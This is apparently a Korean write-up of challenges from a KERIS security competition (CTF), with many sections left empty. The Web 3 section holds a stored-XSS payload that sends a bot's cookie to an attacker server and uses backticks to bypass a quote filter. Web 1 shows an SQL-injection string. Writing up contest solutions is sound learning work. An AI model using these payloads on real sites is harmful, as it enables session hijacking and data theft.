# KERIS 제 4회 정보보안경진대회

![](./bingo.png)

## 법률
구글링

## 시스템 1

## 시스템 2
`exec()`로 명령어를 입력받아 쉘에서 실행하는 프로그램이다.

`cat flag` 했더니 플래그가 나왔다. 약간 어이없었는데 플래그 내용도 fake love 어쩌고 하길래 페이크인 줄 알았는데 진짜였다(...).

## 시스템 3

## 웹 1
`' OR '1'=='1`이였나 했더니 `alert()`로 플래그가 나왔다.

## 웹 2
소스를 봤더니 이상한 이미지를 로드하고 막 나눠서 뿌린다. 원래 이미지의 src를 구해서 들어가면 플래그가 적혀있다.

## 웹 3
게시글을 올리고 바로 볼 수 있는데 XSS가 발생한다. 

쿠키를 확인해보니 여기에 플래그가 들어간다! 이러길래 여기에 스크립트를 올려놓으면 쿠키가 설정된 봇이 읽는 것 같았다.

서버에 `cookie.php`를 올려두고 `location.href=` 어쩌고 할려고 했는데 `location`이 들어가면 XSS라면서 제대로 등록되지 않는다.
`XMLHttpRequest`로 GET 리퀘스트를 보내는 방법으로 쿠키 탈취를 시도했는데 `'`, `"`가 필터링되어서 없어져 버린다.

```js
x = String(/some-string/) // "/some-string/"
x = x.substring(1, x.length-1) // "some-string"
```

위와 같은 방법으로 정규식을 이용해서 필터링 bypass를 시도해봤는데 코드가 너무 길어져서 `input error`가 나온다.

```js
function httpGet(e){
    var t = new XMLHttpRequest;
    return t.open(`GET`, e, !1), t.send(null), t.responseText
}
var u = `http://{server-addr}/cookie.php?c=`;
httpGet(u+document.cookie);
```

구글링을 열심히 해보니 \`를 이용해서 문자열을 선언해도 JS에서는 제대로 인식한다는 것을 알 수 있었다.

대충 위와 같이 스크립트를 짜고(난독화 결과) 쓸데없는 공백과 개행을 없애고 포스팅했다.

스크립트가 제대로 들어간 것을 확인한 뒤 콘솔을 보니까 보안정책 어쩌고 나오길래 안되는 줄 알았다.

```
flag=Flag is Here!!
flag=Flag is Here!!
flag=w3_give_@dviCe_bUT_w3_CaNnoT_give_C0NdUct
flag=Flag is Here!!
flag=Flag is Here!!
flag=Flag is Here!!
flag=Flag is Here!!
flag=Flag is Here!!
```

서버의 `cookie.txt`를 보니까 플래그가 나와있었다.

`w3_give_@dviCe_bUT_w3_CaNnoT_give_C0NdUct`

## 네트워크 1

## 네트워크 2

## 네트워크 3
3단계로 구성되어 있다.

### 1
```
Router> show version
    [+] FLAG1{ C15c0_Pack3t_Tr4c3r_H4ve_U }
```

### 2
```
Router> enable
Router# configure terminal
Router(config)# hostname keris2018
    [+] Ok, you set hostname
Router(config)# enable secret keris2018secret
    [+] Ok, you set enable secret
Router(config)# enable password whoisthewinnerofkeris2018
    [+] Ok, you set enable password
    FLAG2{ Ev3r_u5ed_ittttt? }
```

### 3
```
Router(config)# exit
Router# show routing-config
    enable password 7 08364441000A111F171C050A242E3627353E27010E0551510701
```

`flag1_flag2_encrypt1234` 형식이다.
`C15c0_Pack3t_Tr4c3r_H4ve_U_Ev3r_u5ed_ittttt?_08364441000A111F171C050A242E3627353E27010E0551510701`

## 역공학 1
```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0000000000400686 <+0>:	push   rbp
   0x0000000000400687 <+1>:	mov    rbp,rsp
   0x000000000040068a <+4>:	sub    rsp,0x10
   0x000000000040068e <+8>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400697 <+17>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040069b <+21>:	xor    eax,eax
   0x000000000040069d <+23>:	mov    edi,0x400784
   0x00000000004006a2 <+28>:	call   0x400520 <puts@plt>
   0x00000000004006a7 <+33>:	lea    rax,[rbp-0xc]
   0x00000000004006ab <+37>:	mov    rsi,rax
   0x00000000004006ae <+40>:	mov    edi,0x400797
   0x00000000004006b3 <+45>:	mov    eax,0x0
   0x00000000004006b8 <+50>:	call   0x400560 <__isoc99_scanf@plt>
   0x00000000004006bd <+55>:	mov    eax,DWORD PTR [rbp-0xc]
   0x00000000004006c0 <+58>:	cmp    eax,0x1c05523
   0x00000000004006c5 <+63>:	jne    0x4006db <main+85>
   0x00000000004006c7 <+65>:	mov    edi,0x40079a
   0x00000000004006cc <+70>:	call   0x400540 <system@plt>
   0x00000000004006d1 <+75>:	mov    edi,0x0
   0x00000000004006d6 <+80>:	call   0x400570 <exit@plt>
   0x00000000004006db <+85>:	mov    edi,0x4007a3
   0x00000000004006e0 <+90>:	call   0x400520 <puts@plt>
   0x00000000004006e5 <+95>:	mov    eax,0x0
   0x00000000004006ea <+100>:	mov    rdx,QWORD PTR [rbp-0x8]
   0x00000000004006ee <+104>:	xor    rdx,QWORD PTR fs:0x28
   0x00000000004006f7 <+113>:	je     0x4006fe <main+120>
   0x00000000004006f9 <+115>:	call   0x400530 <__stack_chk_fail@plt>
   0x00000000004006fe <+120>:	leave  
   0x00000000004006ff <+121>:	ret    
End of assembler dump.
gdb-peda$ x/s 0x400784
0x400784:	"Type your password"
gdb-peda$ x/s 0x400797
0x400797:	"%d"
gdb-peda$ x/s 0x40079a
0x40079a:	"cat flag"
gdb-peda$ x/s 0x4007a3
0x4007a3:	"Wrong..."
gdb-peda$
```

`cmp eax,0x1c05523`에서 입력값을 `0x1c05523`와 비교한다. 따라서 패스워드는 `29381923`

패스워드를 정확하게 입력하면 플래그를 준다.

## 역공학 2

## 역공학 3

## 암호학 1
`today is cloudy. so my feeling is not good either.`

## 암호학 2
뚜까

## 암호학 3
